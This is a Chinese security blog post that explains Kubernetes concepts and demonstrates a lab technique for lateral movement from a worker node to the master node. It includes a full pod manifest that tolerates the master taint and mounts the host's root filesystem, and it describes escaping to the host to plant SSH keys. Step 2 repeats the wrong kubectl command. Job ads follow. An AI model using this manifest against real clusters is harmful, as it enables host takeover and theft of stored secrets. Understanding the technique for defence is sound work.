> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iWC-qTy7n7GwrRHMNXsVUA)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

**No.1 Kubernetes 简介**

Kubernetes 是一个可移植的、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。Kubernetes 拥有一个庞大且快速增长的生态系统。Kubernetes 的服务、支持和工具广泛可用。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXOaqlSIGO2BNo8nB7CSGkeAVJSOQDkFqtYibicGMeTevzxaW0qiaVYQUBaWiahdL5znibyWWXfnMfkOVw/640?wx_fmt=png)

**传统部署时代：**

早期，各个组织机构在物理服务器上运行应用程序。无法为物理服务器中的应用程序定义资源边界，这会导致资源分配问题。例如，如果在物理服务器上运行多个应用程序，则可能会出现一个应用程序占用大部分资源的情况， 结果可能导致其他应用程序的性能下降。一种解决方案是在不同的物理服务器上运行每个应用程序，但是由于资源利用不足而无法扩展， 并且维护许多物理服务器的成本很高。

**虚拟化部署时代：**

作为解决方案，引入了虚拟化。虚拟化技术允许你在单个物理服务器的 CPU 上运行多个虚拟机（VM）。虚拟化允许应用程序在 VM 之间隔离，并提供一定程度的安全，因为一个应用程序的信息 不能被另一应用程序随意访问。

虚拟化技术能够更好地利用物理服务器上的资源，并且因为可轻松地添加或更新应用程序 而可以实现更好的可伸缩性，降低硬件成本等等。

每个 VM 是一台完整的计算机，在虚拟化硬件之上运行所有组件，包括其自己的操作系统。

**容器部署时代：**

容器类似于 VM，但是它们具有被放宽的隔离属性，可以在应用程序之间共享操作系统（OS）。因此，容器被认为是轻量级的。容器与 VM 类似，具有自己的文件系统、CPU、内存、进程空间等。由于它们与基础架构分离，因此可以跨云和 OS 发行版本进行移植。

以上摘自 Kubernetes 官方文档：

https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/

**No.2** **Kubernetes 关键概念介绍**

Kubernetes 有如下几个与本文相关的概念：

1、节点 (Node)

2、Pod

3、容忍度 (Toleration) 与污点(Taint)

**节点 (Node)**

Kubernetes 通过将容器放入在节点（Node）上运行的 Pod 中来执行你的工作负载。节点可以是一个虚拟机或者物理机器，取决于所在的集群配置。最容易理解的例子：

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXOaqlSIGO2BNo8nB7CSGkeplH1Q3DJazl87Eeiat4vsMe6kUEYBaecG4Nu2sGiarcU0icslaVIrrzKA/640?wx_fmt=png)

该集群有三个节点，我可以在这三个节点上创建很多个 Pod，而 Pod 中可以包含多个容器。在所有的节点中，至少要有一个 Master 节点，Master 节点是第一个加入集群的机器，它具有整个集群的最高权限，本文的目的就是研究如何通过其他节点，横向移动到 Master 节点，因为 Secret 敏感信息 (令牌、账户密码、公私钥等等) 都存储在 Kubernetes 的 etcd 数据库上。

**Pod**

Pod 是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元。

Pod（就像在鲸鱼荚或者豌豆荚中）是一组（一个或多个） 容器；这些容器共享存储、网络、以及怎样运行这些容器的声明。Pod 中的内容总是并置（colocated）的并且一同调度，在共享的上下文中运行。Pod 所建模的是特定于应用的 “逻辑主机”，其中包含一个或多个应用容器， 这些容器是相对紧密的耦合在一起的。在非云环境中，在相同的物理机或虚拟机上运行的应用类似于 在同一逻辑主机上运行的云应用。

Pod 的共享上下文包括一组 Linux 名字空间、控制组（cgroup）和可能一些其他的隔离方面，即用来隔离 Docker 容器的技术。在 Pod 的上下文中，每个独立的应用可能会进一步实施隔离。

就 Docker 概念的术语而言，Pod 类似于共享名字空间和文件系统卷的一组 Docker 容器，也就是说 Pod 是 Docker 容器的超集。

**容忍度 (Toleration) 与污点(Taint)**

Kubernetes 可以约束一个 Pod 只能在特定的节点上运行。

节点亲和性 是 Pod 的一种属性，它使 Pod 被吸引到一类特定的节点 （这可能出于一种偏好，也可能是硬性要求）。污点（Taint）则相反——它使节点能够排斥一类特定的 Pod。容忍度（Toleration）是应用于 Pod 上的，允许（但并不要求）Pod 调度到带有与之匹配的污点的节点上。**我们可以控制 Pod 创建时候的污点来向集群内的节点进行喷射创建。**

**No.3 环境介绍**

当前实验环境有三个节点，其中一个为 Master 节点，其余的都是普通节点。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXOaqlSIGO2BNo8nB7CSGkeTLNqVVdUNto7W0hnd5TJQDJtbg4Cuxu0DMiabmfE8c9e6oe8Rcvn1Pw/640?wx_fmt=png)

当前机器是 node1，普通节点，节点全部为健康状态，接下来要利用创建 Pod 的功能，横向到 k8s-master。

**No.4 利用创建 Pod 横向移动**

1、确认 Master 节点的容忍度

```
$ kubectl describe node <Node Name>
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXOaqlSIGO2BNo8nB7CSGkeic2c8AL6VQI9QcyNMshYlPk1SJiar1icO6D3ibSnCdax5aIqkqVY0cxwibA/640?wx_fmt=png)

2、创建带有容忍参数的 Pod

```
$ kubectl describe node <Node Name>
```

control-master.yaml 内容：

```
apiVersion: v1
kind: Pod
metadata:
name: control-master-3
spec:
tolerations:
- key: node-role.kubernetes.io/master
operator: Exists
effect: NoSchedule
containers:
- name: control-master-3
image: ubuntu:18.04
command: ["/bin/sleep", "3650d"]
volumeMounts:
- name: master
mountPath: /master
volumes:
- name: master
hostPath:
path: /
type: Directory
```

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXOaqlSIGO2BNo8nB7CSGkeMksgWMC074ZjzgINHoiaBEFDTCzJviaicWlAicqaOva1pLQSwrm5HtZYCA/640?wx_fmt=png)

在多次创建 Pod 后，会发现 Pod 会在 Master 节点上出现，再利用 kubectl 进入容器，执行逃逸。

![图片](https://mmbiz.qpic.cn/mmbiz_png/HxO8NorP4JXOaqlSIGO2BNo8nB7CSGke9jcvrmOhMF1Iic8aDFksZ5ribj6wWfRAPz6x8zkMNSLCepOONYkmAypw/640?wx_fmt=png)

至此，逃逸完成，能够通过写公私钥的方式控制 Master 宿主机。

**No.5 总结**

本文通过了解 Kubernetes 的一些基本概念，完成了在节点中进行横向逃逸，但我没有实现指定节点的逃逸过程，因为在 Kubernetes 中低权限的节点无法修改 Master 节点的容忍度，因此要完成逃逸，需要在每一个节点上至少创建一个 Pod，如果集群中节点数量庞大的话....

**RECRUITMENT**

**招聘启事**

**安恒雷神众测 SRC 运营（实习生）**  
————————  
【职责描述】  
1.  负责 SRC 的微博、微信公众号等线上新媒体的运营工作，保持用户活跃度，提高站点访问量；  
2.  负责白帽子提交漏洞的漏洞审核、Rank 评级、漏洞修复处理等相关沟通工作，促进审核人员与白帽子之间友好协作沟通；  
3.  参与策划、组织和落实针对白帽子的线下活动，如沙龙、发布会、技术交流论坛等；  
4.  积极参与雷神众测的品牌推广工作，协助技术人员输出优质的技术文章；  
5.  积极参与公司媒体、行业内相关媒体及其他市场资源的工作沟通工作。  
【任职要求】   
 1.  责任心强，性格活泼，具备良好的人际交往能力；  
 2.  对网络安全感兴趣，对行业有基本了解；  
 3.  良好的文案写作能力和活动组织协调能力。

简历投递至 

bountyteam@dbappsecurity.com.cn

**设计师（实习生）**  

————————

【职位描述】  
负责设计公司日常宣传图片、软文等与设计相关工作，负责产品品牌设计。  
【职位要求】  
1、从事平面设计相关工作 1 年以上，熟悉印刷工艺；具有敏锐的观察力及审美能力，及优异的创意设计能力；有 VI 设计、广告设计、画册设计等专长；  
2、有良好的美术功底，审美能力和创意，色彩感强；

3、精通 photoshop/illustrator/coreldrew / 等设计制作软件；  
4、有品牌传播、产品设计或新媒体视觉工作经历；  
【关于岗位的其他信息】  
企业名称：杭州安恒信息技术股份有限公司  
办公地点：杭州市滨江区安恒大厦 19 楼  
学历要求：本科及以上  
工作年限：1 年及以上，条件优秀者可放宽

简历投递至 

bountyteam@dbappsecurity.com.cn

安全招聘  

————————  
公司：安恒信息  
岗位：**Web 安全 安全研究员**  
部门：战略支援部  
薪资：13-30K  
工作年限：1 年 +  
工作地点：杭州（总部）、广州、成都、上海、北京

工作环境：一座大厦，健身场所，医师，帅哥，美女，高级食堂…  
【岗位职责】  
1. 定期面向部门、全公司技术分享;  
2. 前沿攻防技术研究、跟踪国内外安全领域的安全动态、漏洞披露并落地沉淀；  
3. 负责完成部门渗透测试、红蓝对抗业务;  
4. 负责自动化平台建设  
5. 负责针对常见 WAF 产品规则进行测试并落地 bypass 方案  
【岗位要求】  
1. 至少 1 年安全领域工作经验；  
2. 熟悉 HTTP 协议相关技术  
3. 拥有大型产品、CMS、厂商漏洞挖掘案例；  
4. 熟练掌握 php、java、asp.net 代码审计基础（一种或多种）  
5. 精通 Web Fuzz 模糊测试漏洞挖掘技术  
6. 精通 OWASP TOP 10 安全漏洞原理并熟悉漏洞利用方法  
7. 有过独立分析漏洞的经验，熟悉各种 Web 调试技巧  
8. 熟悉常见编程语言中的至少一种（Asp.net、Python、php、java）  
【加分项】  
1. 具备良好的英语文档阅读能力；  
2. 曾参加过技术沙龙担任嘉宾进行技术分享；  
3. 具有 CISSP、CISA、CSSLP、ISO27001、ITIL、PMP、COBIT、Security+、CISP、OSCP 等安全相关资质者；  
4. 具有大型 SRC 漏洞提交经验、获得年度表彰、大型 CTF 夺得名次者；  
5. 开发过安全相关的开源项目；  
6. 具备良好的人际沟通、协调能力、分析和解决问题的能力者优先；  
7. 个人技术博客；  
8. 在优质社区投稿过文章；

岗位：**安全红队武器自动化工程师**  
薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 熟练使用 Python、java、c/c++ 等至少一门语言作为主要开发语言；  
2. 熟练使用 Django、flask 等常用 web 开发框架、以及熟练使用 mysql、mongoDB、redis 等数据存储方案；  
3: 熟悉域安全以及内网横向渗透、常见 web 等漏洞原理；  
4. 对安全技术有浓厚的兴趣及热情，有主观研究和学习的动力；  
5. 具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。

简历投递至

bountyteam@dbappsecurity.com.cn

岗位：**红队武器化 Golang 开发工程师**  

薪资：13-30K  
工作年限：2 年 +  
工作地点：杭州（总部）  
【岗位职责】  
1. 负责红蓝对抗中的武器化落地与研究；  
2. 平台化建设；  
3. 安全研究落地。  
【岗位要求】  
1. 掌握 C/C++/Java/Go/Python/JavaScript 等至少一门语言作为主要开发语言；  
2. 熟练使用 Gin、Beego、Echo 等常用 web 开发框架、熟悉 MySQL、Redis、MongoDB 等主流数据库结构的设计, 有独立部署调优经验；  
3. 了解 docker，能进行简单的项目部署；  
3. 熟悉常见 web 漏洞原理，并能写出对应的利用工具；  
4. 熟悉 TCP/IP 协议的基本运作原理；  
5. 对安全技术与开发技术有浓厚的兴趣及热情，有主观研究和学习的动力，具备正向价值观、良好的团队协作能力和较强的问题解决能力，善于沟通、乐于分享。  
【加分项】  
1. 有高并发 tcp 服务、分布式、消息队列等相关经验者优先；  
2. 在 github 上有开源安全产品优先；  
3: 有过安全开发经验、独自分析过相关开源安全工具、以及参与开发过相关后渗透框架等优先；  
4. 在 freebuf、安全客、先知等安全平台分享过相关技术文章优先；  
5. 具备良好的英语文档阅读能力。  
简历投递至

bountyteam@dbappsecurity.com.cn

END

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CtGxzWjGs5uX46SOybVAyYzY0p5icTsasu9JSeiaic9ambRjmGVWuvxFbhbhPCQ34sRDicJwibicBqDzJQx8GIM3AQXQ/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWsZ9ibsYKOiaiaPviaSwPEnMZAtx6BVCkP3JoxaaDmiaU7PWt8fFdwbPkXDAf90wcWVowsqZheTHb0GcQ/640?wx_fmt=jpeg)

![图片](https://mmbiz.qpic.cn/mmbiz_gif/0BNKhibhMh8eiasiaBAEsmWfxYRZOZdgDBevusQUZzjTCG5QB8B4wgy8TSMiapKsHymVU4PnYYPrSgtQLwArW5QMUA/640?wx_fmt=gif)

**长按识别二维码关注我们**